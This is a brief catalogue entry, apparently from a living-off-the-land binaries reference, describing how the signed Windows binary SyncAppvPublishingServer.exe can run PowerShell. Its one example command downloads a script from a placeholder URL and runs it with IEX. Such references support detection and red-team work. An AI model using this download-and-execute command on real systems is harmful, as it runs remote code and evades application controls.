## SyncAppvPublishingServer.exe
* Functions: Execute
```

SyncAppvPublishingServer.exe "n;(New-Object Net.WebClient).DownloadString('http://some.url/script.ps1') | IEX"
Example command on how inject Powershell code into the process
```
   
* Resources:   
  * https://twitter.com/monoxgas/status/895045566090010624
   
* Full path:   
  * C:\Windows\System32\SyncAppvPublishingServer.exe
   
* Notes: Thanks to Nick Landers - @monoxgas  
   
